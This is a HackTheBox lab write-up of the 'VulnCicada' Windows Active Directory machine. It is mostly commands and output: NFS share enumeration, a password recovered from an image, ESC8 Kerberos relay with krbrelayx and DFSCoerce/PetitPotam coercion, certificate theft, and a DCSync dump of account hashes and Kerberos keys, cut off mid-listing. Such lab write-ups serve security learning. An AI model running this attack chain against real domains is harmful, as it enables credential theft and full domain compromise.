---
title: "HTB - VulnCicada Writeup"
date: 2026-11-10 08:34:00 +0700
categories: [HackTheBox, Machines]
tags: [windows, medium]
---
VulnCicada is a Medium Windows Active Directory machine that involves discovering a password inside an image on a public share. With that password an attacker is able to discover that the machine is vulnerable to ESC8 and can use Kerberos relaying to bypass self-relay restrictions in order to get a certificate as the machine account itself. With this new certificate, we are able to dump the hashes of the Administrator user and thus compromise the whole domain.
## P0
First of all, I use **rustscan** to findout all opened port:
```
└─$ rustscan -a 10.129.69.173 --ulimit 5000 --range 0-65535 --no-banner --scripts none
[~] Automatically increasing ulimit value to 5000.
Open 10.129.69.173:53
Open 10.129.69.173:80
Open 10.129.69.173:88
Open 10.129.69.173:111
Open 10.129.69.173:135
Open 10.129.69.173:139
Open 10.129.69.173:389
Open 10.129.69.173:445
Open 10.129.69.173:464
Open 10.129.69.173:593
Open 10.129.69.173:636
Open 10.129.69.173:2049
Open 10.129.69.173:3268
Open 10.129.69.173:3269
Open 10.129.69.173:3389
Open 10.129.69.173:9389
Open 10.129.69.173:49667
Open 10.129.69.173:49664
Open 10.129.69.173:50597
Open 10.129.69.173:50671
Open 10.129.69.173:51146
Open 10.129.69.173:51891
Open 10.129.69.173:51892
10.129.69.173 -> [53,80,88,111,135,139,389,445,464,593,636,2049,3268,3269,3389,9389,49667,49664,50597,50671,51146,51891,51892]
```
Next, I use nmap for get all details:
```
└─$ nmap -O -sV -sC -Pn --disable-arp-ping --traceroute -p53,80,88,111,135,139,389,445,464,593,636,2049,3268,3269,3389,9389,49667,49664,50597,50671,51146,51891,51892 -oN 10.129.69.173_nmap 10.129.69.173
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-10 08:51 -0500
Nmap scan report for 10.129.69.173 (10.129.69.173)
Host is up (0.038s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-11-10 07:11:18Z)
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind                                                                                                                                               
|   100000  2,3,4        111/tcp6  rpcbind                                                                                                                                               
|   100000  2,3,4        111/udp   rpcbind                                                                                                                                               
|   100000  2,3,4        111/udp6  rpcbind                                                                                                                                               
|   100003  2,3         2049/udp   nfs                                                                                                                                                   
|   100003  2,3         2049/udp6  nfs                                                                                                                                                   
|   100003  2,3,4       2049/tcp   nfs                                                                                                                                                   
|   100003  2,3,4       2049/tcp6  nfs                                                                                                                                                   
|   100005  1,2,3       2049/tcp   mountd                                                                                                                                                
|   100005  1,2,3       2049/tcp6  mountd                                                                                                                                                
|   100005  1,2,3       2049/udp   mountd                                                                                                                                                
|   100005  1,2,3       2049/udp6  mountd                                                                                                                                                
|   100021  1,2,3,4     2049/tcp   nlockmgr                                                                                                                                              
|   100021  1,2,3,4     2049/tcp6  nlockmgr                                                                                                                                              
|   100021  1,2,3,4     2049/udp   nlockmgr                                                                                                                                              
|   100021  1,2,3,4     2049/udp6  nlockmgr                                                                                                                                              
|   100024  1           2049/tcp   status                                                                                                                                                
|   100024  1           2049/tcp6  status                                                                                                                                                
|   100024  1           2049/udp   status                                                                                                                                                
|_  100024  1           2049/udp6  status                                                                                                                                                
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-11-10T06:54:34
|_Not valid after:  2027-11-10T06:54:34
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-11-10T06:54:34
|_Not valid after:  2027-11-10T06:54:34
|_ssl-date: TLS randomness does not represent time
2049/tcp  open  nlockmgr      1-4 (RPC #100021)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-11-10T06:54:34
|_Not valid after:  2027-11-10T06:54:34
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-11-10T06:54:34
|_Not valid after:  2027-11-10T06:54:34
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-11-10T07:13:09+00:00; -6h40m07s from scanner time.
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Not valid before: 2026-11-09T07:02:17
|_Not valid after:  2027-05-11T07:02:17
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
50597/tcp open  msrpc         Microsoft Windows RPC
50671/tcp open  msrpc         Microsoft Windows RPC
51146/tcp open  msrpc         Microsoft Windows RPC
51891/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
51892/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|10|11|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC-JPQ225; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-11-10T07:12:28
|_  start_date: N/A
|_clock-skew: mean: -6h40m09s, deviation: 2s, median: -6h40m11s

TRACEROUTE (using port 51892/tcp)
HOP RTT      ADDRESS
1   39.67 ms 10.10.14.1 (10.10.14.1)
2   39.98 ms 10.129.69.173 (10.129.69.173)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 127.93 seconds
```
## P1
```
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.129.69.173 dc-jpq225.cicada.vl cicada.vl
```
```
└─$ showmount -e 10.129.69.173
Export list for 10.129.69.173:
/profiles (everyone)
```
```
└─$ sudo mount -t nfs 10.129.69.173:/profiles ./profiles -o nolock
```
In `./profiles/Rosie.Powell` we can find out a image name `marketing.png`. Try to open it but we fail. By taking advatange of the help from AI :), we can fix it and open it again.

![Upgrade_Notice.pdf](assets/image/htb/vulncicada/2026-11-10_16-05.png){: w="700" }

![Upgrade_Notice.pdf](assets/image/htb/vulncicada/2026-11-10_16-04.png){: w="700" }

![Upgrade_Notice.pdf](assets/image/htb/vulncicada/2026-11-10_16-05_1.png){: w="700" }

From `marketing.png`, we can see a strange string which looks like a password `cicada123`. Why dont' we try it :D<br>
This time, my `nxc smb` command has one more option `-k` which require it to use kerberos authentication rather than normal NLTM authentication. Thanks AI for explaining it for me :).

```
└─$ nxc smb 10.129.69.173 -u 'Rosie.Powell' -p 'Cicada123' -d cicada.vl -k
SMB         10.129.69.173     445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         10.129.69.173     445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123
```
We can only authenticate user `Rosie.Powell` by using Kerberos. This means from here when using other tools, we must find a way to authenticate those tools with kerberos or else they will fail.

## P2 & A1
```
└─$ rusthound-ce -d cicada.vl -f dc-jpq225.cicada.vl -u 'Rosie.Powell@cicada.vl' -p 'Cicada123' -i 10.129.69.173 -k -z 
---------------------------------------------------
Initializing RustHound-CE at 20:28:36 on 11/11/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-11-12T01:28:36Z INFO  rusthound_ce] Verbosity level: Info
[2026-11-12T01:28:36Z INFO  rusthound_ce] Collection method: All
Error: GssapiOperationError("No credentials were supplied, or the credentials were unavailable or inaccessible (No Kerberos credentials available (default cache: FILE:/tmp/krb5cc_1000))")
```
```
└─$ cat /etc/krb5.conf 
[libdefaults]
    default_realm = CICADA.VL
    dns_lookup_kdc = false

[realms]
    CICADA.VL = {
        kdc = dc-jpq225.cicada.vl
        admin_server = dc-jpq225.cicada.vl
    }

[domain_realm]
    .cicada.vl = CICADA.VL
    cicada.vl = CICADA.VL
```
```
└─$ impacket-getTGT -k cicada/Rosie.Powell:Cicada123 -dc-ip 10.129.69.173                                   
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Rosie.Powell.ccache
```
```
└─$ export KRB5CCNAME=$(pwd)/Rosie.Powell.ccache
```
```
└─$ rusthound-ce -d cicada.vl -f dc-jpq225.cicada.vl -u 'Rosie.Powell@cicada.vl' -p 'Cicada123' -i 10.129.69.173 -k -z
---------------------------------------------------
Initializing RustHound-CE at 20:35:25 on 11/11/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-11-12T01:35:25Z INFO  rusthound_ce] Verbosity level: Info
[2026-11-12T01:35:25Z INFO  rusthound_ce] Collection method: All
[2026-11-12T01:35:25Z INFO  rusthound_ce::ldap] Connected to CICADA.VL Active Directory!
[2026-11-12T01:35:25Z INFO  rusthound_ce::ldap] Starting data collection...
[2026-11-12T01:35:25Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-11-12T01:35:27Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=cicada,DC=vl
[2026-11-12T01:35:27Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-11-12T01:35:27Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=cicada,DC=vl
[2026-11-12T01:35:27Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-11-12T01:35:27Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=cicada,DC=vl
[2026-11-12T01:35:27Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-11-12T01:35:27Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=cicada,DC=vl
[2026-11-12T01:35:27Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-11-12T01:35:29Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=cicada,DC=vl
[2026-11-12T01:35:29Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
⢀ Parsing LDAP objects: 39%                                                                                                                                                                  [2026-11-12T01:35:29Z INFO  rusthound_ce::objects::domain] MachineAccountQuota: 10
[2026-11-12T01:35:29Z INFO  rusthound_ce::objects::enterpriseca] Found 11 enabled certificate templates
[2026-11-12T01:35:29Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-11-12T01:35:29Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-11-12T01:35:29Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-11-12T01:35:29Z INFO  rusthound_ce::json::maker::common] 14 users parsed!
[2026-11-12T01:35:29Z INFO  rusthound_ce::json::maker::common] 62 groups parsed!
[2026-11-12T01:35:29Z INFO  rusthound_ce::json::maker::common] 1 computers parsed!
[2026-11-12T01:35:29Z INFO  rusthound_ce::json::maker::common] 2 ous parsed!
[2026-11-12T01:35:29Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2026-11-12T01:35:29Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2026-11-12T01:35:29Z INFO  rusthound_ce::json::maker::common] 74 containers parsed!
[2026-11-12T01:35:29Z INFO  rusthound_ce::json::maker::common] 1 ntauthstores parsed!
[2026-11-12T01:35:29Z INFO  rusthound_ce::json::maker::common] 1 aiacas parsed!
[2026-11-12T01:35:29Z INFO  rusthound_ce::json::maker::common] 1 rootcas parsed!
[2026-11-12T01:35:29Z INFO  rusthound_ce::json::maker::common] 1 enterprisecas parsed!
[2026-11-12T01:35:29Z INFO  rusthound_ce::json::maker::common] 33 certtemplates parsed!
[2026-11-12T01:35:29Z INFO  rusthound_ce::json::maker::common] 3 issuancepolicies parsed!
[2026-11-12T01:35:29Z INFO  rusthound_ce::json::maker::common] .//20261111203529_cicada-vl_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 20:35:29 on 11/11/26! Happy Graphing!
```
Hmm, have many certificate templates. Maybe this AD have ADCS integrated with it.

![Upgrade_Notice.pdf](assets/image/htb/vulncicada/2026-11-12_08-36.png){: w="700" }

```
└─$ certipy find -target dc-jpq225.cicada.vl -dc-ip 10.129.69.173 -u Rosie.Powell@cicada.vl -p 'Cicada123' -stdout -vulnerable -k 
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'cicada-DC-JPQ225-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'cicada-DC-JPQ225-CA'
[*] Checking web enrollment for CA 'cicada-DC-JPQ225-CA' @ 'DC-JPQ225.cicada.vl'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : cicada-DC-JPQ225-CA
    DNS Name                            : DC-JPQ225.cicada.vl
    Certificate Subject                 : CN=cicada-DC-JPQ225-CA, DC=cicada, DC=vl
    Certificate Serial Number           : 1968B4EF03745FBC460CADDF1939469D
    Certificate Validity Start          : 2026-11-11 08:23:36+00:00
    Certificate Validity End            : 2526-11-11 08:33:36+00:00
    Web Enrollment
      HTTP
        Enabled                         : True
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CICADA.VL\Administrators
      Access Rights
        ManageCa                        : CICADA.VL\Administrators
                                          CICADA.VL\Domain Admins
                                          CICADA.VL\Enterprise Admins
        ManageCertificates              : CICADA.VL\Administrators
                                          CICADA.VL\Domain Admins
                                          CICADA.VL\Enterprise Admins
        Enroll                          : CICADA.VL\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled over HTTP.
Certificate Templates                   : [!] Could not find any certificate templates
```
Thanks to `certipy`, we realize that ADCS itself is vulnerable with `ESC8`. We need to understand little bit about `ESC8` first.<br>
## P3 & P4
`ESC8` is vulnerability which allow user to enroll certificate directly on website. To access that website, user must authenticate by either NTLM or Kerberos. But now, NTLM authentication is disabled so users can only use Kerberos authentication. After successfully login, ADCS will respond a valid certificate to user but this certificate will only have permissions respective that user<br>
So to exploit in this context, attacker need to find a way to login as a privileged user (domain admin or computer domain controller account) so that they can achieve a privileged certificate. The method people usually think to right away is relay. But now NLTM authentication is disabled. So we need to find a way to Kerberos relay and then achieve the related certificate. So I search on the Internet how to do Kerberos relay. Luckily I find out [this blog](https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx) so I follow step by step from it:

First of all, we need to add a dns record. 
```
└─$ bloodyAD -d cicada.vl -H dc-jpq225.cicada.vl -k ccache=/home/kali/htb/rosie.powell.ccache add dnsRecord 'dc-jpq2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' '10.10.15.107'
[+] Adding "dc-jpq2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" to "DC=cicada.vl,CN=MicrosoftDNS,DC=DomainDnsZones,DC=cicada,DC=vl"
[+] dc-jpq2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA has been successfully added
```
```
└─$ dig DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA.cicada.vl @10.129.69.173

; <<>> DiG 9.20.23-1-Debian <<>> DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA.cicada.vl @10.129.69.173
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 408
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA.cicada.vl. IN A

;; ANSWER SECTION:
DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA.cicada.vl. 300 IN A 10.10.15.107

;; Query time: 56 msec
;; SERVER: 10.129.69.173#53(10.129.69.173) (UDP)
;; WHEN: Sat Nov 14 04:58:15 EST 2026
;; MSG SIZE  rcvd: 108
```
Okey, now the DNS record has been successfully added. Now we need to use `krbrelayx` to kerberos relay:
```
└─$ sudo krbrelayx -t 'http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp' --adcs --template DomainController --victim 'dc-jpq225$' -ip '10.10.15.107' -debug
[sudo] password for kali: 
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMB loaded..
[*] Running in attack mode to single host
[*] Running in kerberos relay mode because no credentials were specified.
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up DNS Server

[*] Servers started, waiting for connections
```
Okey, everything looks like oke right now. Next we need to find a way so that attacker can coerce domain controller make a Kerberos authentication to the attacker machine. We can use `nxc smb` with module `coerce_plus` like below:
```
└─$ nxc smb dc-jpq225.cicada.vl -u 'Rosie.Powell' -p 'Cicada123'  -k -M coerce_plus -o LISTENER="dc-jpq2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA"
SMB         dc-jpq225.cicada.vl 445    dc-jpq225        [*]  x64 (name:dc-jpq225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         dc-jpq225.cicada.vl 445    dc-jpq225        [+] cicada.vl\Rosie.Powell:Cicada123 
COERCE_PLUS dc-jpq225.cicada.vl 445    dc-jpq225        VULNERABLE, DFSCoerce
COERCE_PLUS dc-jpq225.cicada.vl 445    dc-jpq225        Exploit Success, netdfs\NetrDfsRemoveRootTarget
COERCE_PLUS dc-jpq225.cicada.vl 445    dc-jpq225        Exploit Success, netdfs\NetrDfsAddStdRoot
COERCE_PLUS dc-jpq225.cicada.vl 445    dc-jpq225        Exploit Success, netdfs\NetrDfsRemoveStdRoot
COERCE_PLUS dc-jpq225.cicada.vl 445    dc-jpq225        VULNERABLE, PetitPotam
COERCE_PLUS dc-jpq225.cicada.vl 445    dc-jpq225        Exploit Success, efsrpc\EfsRpcAddUsersToFile
COERCE_PLUS dc-jpq225.cicada.vl 445    dc-jpq225        VULNERABLE, PrinterBug
COERCE_PLUS dc-jpq225.cicada.vl 445    dc-jpq225        Exploit Success, spoolss\RpcRemoteFindFirstPrinterChangeNotificationEx
```
Check again on `krbrelayx` terminal, we see that `dc-jpq225.pfx` has been successfully created. And of course, this certificate is respective with `dc-jpq225$` account which have privileged permissions.
```
└─$ sudo krbrelayx -t 'http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp' -ip 10.10.15.107 --adcs --template DomainController --victim 'dc-jpq225$'
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMB loaded..
[*] Running in attack mode to single host
[*] Running in kerberos relay mode because no credentials were specified.
[*] Setting up SMB Server

[*] Setting up HTTP Server on port 80
[*] Setting up DNS Server
[*] Servers started, waiting for connections
[*] SMBD: Received connection from 10.129.69.173
[*] HTTP server returned status code 200, treating as a successful login
[*] SMBD: Received connection from 10.129.69.173
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] HTTP server returned status code 200, treating as a successful login
[*] SMBD: Received connection from 10.129.69.173
[*] HTTP server returned status code 200, treating as a successful login
[*] SMBD: Received connection from 10.129.69.173
[*] Skipping user dc-jpq225$ since attack was already performed
[*] HTTP server returned status code 200, treating as a successful login
[*] SMBD: Received connection from 10.129.69.173
[*] Skipping user dc-jpq225$ since attack was already performed
[*] HTTP server returned status code 200, treating as a successful login
[*] Skipping user dc-jpq225$ since attack was already performed
[*] Skipping user dc-jpq225$ since attack was already performed
[*] SMBD: Received connection from 10.129.69.173
[*] HTTP server returned status code 200, treating as a successful login
[*] SMBD: Received connection from 10.129.69.173
[*] HTTP server returned status code 200, treating as a successful login
[*] SMBD: Received connection from 10.129.69.173
[*] HTTP server returned status code 200, treating as a successful login
[*] Skipping user dc-jpq225$ since attack was already performed
[*] Skipping user dc-jpq225$ since attack was already performed
[*] Skipping user dc-jpq225$ since attack was already performed
[*] SMBD: Received connection from 10.129.69.173
[*] HTTP server returned status code 200, treating as a successful login
[*] SMBD: Received connection from 10.129.69.173
[*] Skipping user dc-jpq225$ since attack was already performed
[*] HTTP server returned status code 200, treating as a successful login
[*] SMBD: Received connection from 10.129.69.173
[*] HTTP server returned status code 200, treating as a successful login
[*] Skipping user dc-jpq225$ since attack was already performed
[*] Skipping user dc-jpq225$ since attack was already performed
[*] SMBD: Received connection from 10.129.69.173
[*] HTTP server returned status code 200, treating as a successful login
[*] GOT CERTIFICATE! ID 89
[*] SMBD: Received connection from 10.129.69.173
[*] Writing PKCS#12 certificate to ./dc-jpq225.pfx
[*] Certificate successfully written to file
[*] Skipping user dc-jpq225$ since attack was already performed
[*] HTTP server returned status code 200, treating as a successful login
[*] Skipping user dc-jpq225$ since attack was already performed
[*] SMBD: Received connection from 10.129.69.173
[-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
[*] SMBD: Received connection from 10.129.69.173
[-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
```
Good, now we will continue use `certipy auth` to authenticate with the certicate which has just been created:
```
└─$ certipy auth -pfx dc-jpq225.pfx -dc-ip 10.129.69.173 
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'DC-JPQ225.cicada.vl'
[*]     Security Extension SID: 'S-1-5-21-687703393-1447795882-66098247-1000'
[*] Using principal: 'dc-jpq225$@cicada.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'dc-jpq225.ccache'
[*] Wrote credential cache to 'dc-jpq225.ccache'
[*] Trying to retrieve NT hash for 'dc-jpq225$'
[*] Got hash for 'dc-jpq225$@cicada.vl': aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3
```
We are now having certificate respective `dc-jpq225$`. We can use it for `dcsync`:
```
└─$ impacket-secretsdump -dc-ip 10.129.69.173 -k -no-pass dc-jpq225.cicada.vl
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8dd165a43fcb66d6a0e2924bb67e040c:::
cicada.vl\Shirley.West:1104:aad3b435b51404eeaad3b435b51404ee:ff99630bed1e3bfd90e6a193d603113f:::
cicada.vl\Jordan.Francis:1105:aad3b435b51404eeaad3b435b51404ee:f5caf661b715c4e1435dfae92c2a65e3:::
cicada.vl\Jane.Carter:1106:aad3b435b51404eeaad3b435b51404ee:7e133f348892d577014787cbc0206aba:::
cicada.vl\Joyce.Andrews:1107:aad3b435b51404eeaad3b435b51404ee:584c796cd820a48be7d8498bc56b4237:::
cicada.vl\Daniel.Marshall:1108:aad3b435b51404eeaad3b435b51404ee:8cdf5eeb0d101559fa4bf00923cdef81:::
cicada.vl\Rosie.Powell:1109:aad3b435b51404eeaad3b435b51404ee:ff99630bed1e3bfd90e6a193d603113f:::
cicada.vl\Megan.Simpson:1110:aad3b435b51404eeaad3b435b51404ee:6e63f30a8852d044debf94d73877076a:::
cicada.vl\Katie.Ward:1111:aad3b435b51404eeaad3b435b51404ee:42f8890ec1d9b9c76a187eada81adf1e:::
cicada.vl\Richard.Gibbons:1112:aad3b435b51404eeaad3b435b51404ee:d278a9baf249d01b9437f0374bf2e32e:::
cicada.vl\Debra.Wright:1113:aad3b435b51404eeaad3b435b51404ee:d9a2147edbface1666532c9b3acafaf3:::
DC-JPQ225$:1000:aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:f9181ec2240a0d172816f3b5a185b6e3e0ba773eae2c93a581d9415347153e1a
Administrator:aes128-cts-hmac-sha1-96:926e5da4d5cd0be6e1cea21769bb35a4
Administrator:des-cbc-md5:fd2a29621f3e7604
krbtgt:aes256-cts-hmac-sha1-96:ed5b82d607535668e59aa8deb651be5abb9f1da0d31fa81fd24f9890ac84693d
krbtgt:aes128-cts-hmac-sha1-96:9b7825f024f21e22e198e4aed70ff8ea
krbtgt:des-cbc-md5:2a768a9e2c983e31
cicada.vl\Shirley.West:aes256-cts-hmac-sha1-96:3f3657fb6f0d441680e9c5e0c104ef4005fa5e79b01bbeed47031b04a913f353
cicada.vl\Shirley.West:aes128-cts-hmac-sha1-96:cd16a8664de29a4e8bd9e8b492f3eef9
cicada.vl\Shirley.West:des-cbc-md5:abbf341664bafe76
cicada.vl\Jordan.Francis:aes256-cts-hmac-sha1-96:ec8aaa2c9432ed3b0d2834e4e24dc243ec8d77ec3488101e79d1b2cc1c2ee6ea
cicada.vl\Jordan.Francis:aes128-cts-hmac-sha1-96:0b551142246edc108a92913e46852404
cicada.vl\Jordan.Francis:des-cbc-md5:a2e53d6ea44ab6e9
cicada.vl\Jane.Carter:aes256-cts-hmac-sha1-96:bb04095d1884439b825a5606dd43aadfd2a8fad1386b3728b9bad582efd5d4aa
cicada.vl\Jane.Carter:aes128-cts-hmac-sha1-96:8a27618e7036a49fb6e371f2e7af649e
cicada.vl\Jane.Carter:des-cbc-md5:340eda8962cbadce
cicada.vl\Joyce.Andrews:aes256-cts-hmac-sha1-96:7ca8317638d429301dfbb88af701fadffbc106d31f79a4de7e8d35afbc2d30c4
cicada.vl\Joyce.Andrews:aes128-cts-hmac-sha1-96:6ec2495dea28c09cf636dd8b080012fd
cicada.vl\Joyce.Andrews:des-cbc-md5:6bf2b6f21fcda258
cicada.vl\Daniel.Marshall:aes256-cts-hmac-sha1-96:fcccb590bac0a888898461247fbb3ee28d282671d8491e0b0b83ac688c2a29d6
cicada.vl\Daniel.Marshall:aes128-cts-hmac-sha1-96:80a3b053500586eefd07d32fc03e3849
cicada.vl\Daniel.Marshall:des-cbc-md5:e0fbdcb3c7e9f154
cicada.vl\Rosie.Powell:aes256-cts-hmac-sha1-96:54de41137f8d37d4a6beac1638134dfefa73979041cae3ffc150ebcae470fce5
cicada.vl\Rosie.Powell:aes128-cts-hmac-sha1-96:d01b3b63a2cde0d1c5e9e0e4a55529a4
cicada.vl\Rosie.Powell:des-cbc-md5:6e70b9a41a677a94
cicada.vl\Megan.Simpson:aes256-cts-hmac-sha1-96:cdb94aaf5b15465371cbe42913d652fa7e2a2e43afc8dd8a17fee1d3f142da3b
cicada.vl\Megan.Simpson:aes128-cts-hmac-sha1-96:8fd3f86397ee83ed140a52bdfa321df0
cicada.vl\Megan.Simpson:des-cbc-md5:587032806b5d19b6
cicada.vl\Katie.Ward:aes256-cts-hmac-sha1-96:829effafe88a0a5e17c4ccf1840f277327309b2902aeccc36625ac51b8e936bc
cicada.vl\Katie.Ward:aes128-cts-hmac-sha1-96:585264bc071354147db5b677be13506b
